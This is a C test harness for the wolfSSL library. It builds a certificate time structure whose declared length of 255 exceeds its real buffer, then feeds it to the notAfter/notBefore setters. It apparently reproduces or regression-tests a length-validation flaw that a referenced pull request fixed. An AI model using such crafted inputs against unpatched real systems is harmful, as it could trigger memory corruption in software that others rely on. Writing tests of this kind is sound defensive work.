#include <stdio.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/ssl.h>
#include <wolfssl/openssl/x509.h>
#include <wolfssl/openssl/asn1.h>
#include <wolfssl/wolfcrypt/asn.h>

#ifndef ASN_UTC_TIME
#define ASN_UTC_TIME 0x17
#endif

static void make_crafted_time(WOLFSSL_ASN1_TIME* t)
{
    const unsigned char valid_utc[] = "250101120000Z";
    const int valid_utc_len = 13;

    memset(t, 0, sizeof(*t));

    t->type = ASN_UTC_TIME;

    /*
     * PR 10071 official test uses length = 255.
     * The fixed implementation rejects this because it exceeds CTC_DATE_SIZE - 2.
     */
    t->length = 255;

    /*
     * Fill only the real data array safely.
     * Do not write 255 bytes here, otherwise the harness itself would overflow.
     */
    memset(t->data, 'A', sizeof(t->data));
    memcpy(t->data, valid_utc, valid_utc_len);
}

static int run_not_after(WOLFSSL_X509* x)
{
    WOLFSSL_ASN1_TIME crafted_time;
    const unsigned char* raw;
    int ret;

    make_crafted_time(&crafted_time);

    fprintf(stderr, "[*] calling wolfSSL_X509_set_notAfter with crafted_time.length=%d\n",
            crafted_time.length);

    ret = wolfSSL_X509_set_notAfter(x, &crafted_time);

    fprintf(stderr, "[*] wolfSSL_X509_set_notAfter returned %d\n", ret);

    fprintf(stderr, "[*] calling wolfSSL_X509_notAfter\n");

    raw = wolfSSL_X509_notAfter(x);

    fprintf(stderr, "[*] wolfSSL_X509_notAfter returned %p\n", (void*)raw);

    if (raw != NULL) {
        fprintf(stderr, "[*] raw[0]=0x%02x raw[1]=%u\n", raw[0], raw[1]);
    }

    return ret;
}

static int run_not_before(WOLFSSL_X509* x)
{
    WOLFSSL_ASN1_TIME crafted_time;
    const unsigned char* raw;
    int ret;

    make_crafted_time(&crafted_time);

    fprintf(stderr, "[*] calling wolfSSL_X509_set_notBefore with crafted_time.length=%d\n",
            crafted_time.length);

    ret = wolfSSL_X509_set_notBefore(x, &crafted_time);

    fprintf(stderr, "[*] wolfSSL_X509_set_notBefore returned %d\n", ret);

    fprintf(stderr, "[*] calling wolfSSL_X509_notBefore\n");

    raw = wolfSSL_X509_notBefore(x);

    fprintf(stderr, "[*] wolfSSL_X509_notBefore returned %p\n", (void*)raw);

    if (raw != NULL) {
        fprintf(stderr, "[*] raw[0]=0x%02x raw[1]=%u\n", raw[0], raw[1]);
    }

    return ret;
}

int main(int argc, char** argv)
{
    WOLFSSL_X509* x;
    int ret = 0;

    if (argc != 2) {
        fprintf(stderr, "usage: %s <after|before>\n", argv[0]);
        return 2;
    }

    wolfSSL_Init();

    x = X509_new();
    if (x == NULL) {
        fprintf(stderr, "X509_new failed\n");
        wolfSSL_Cleanup();
        return 3;
    }

    if (strcmp(argv[1], "after") == 0) {
        ret = run_not_after(x);
    }
    else if (strcmp(argv[1], "before") == 0) {
        ret = run_not_before(x);
    }
    else {
        fprintf(stderr, "unknown mode: %s\n", argv[1]);
        X509_free(x);
        wolfSSL_Cleanup();
        return 2;
    }

    X509_free(x);
    wolfSSL_Cleanup();

    return ret == WOLFSSL_SUCCESS ? 0 : 1;
}
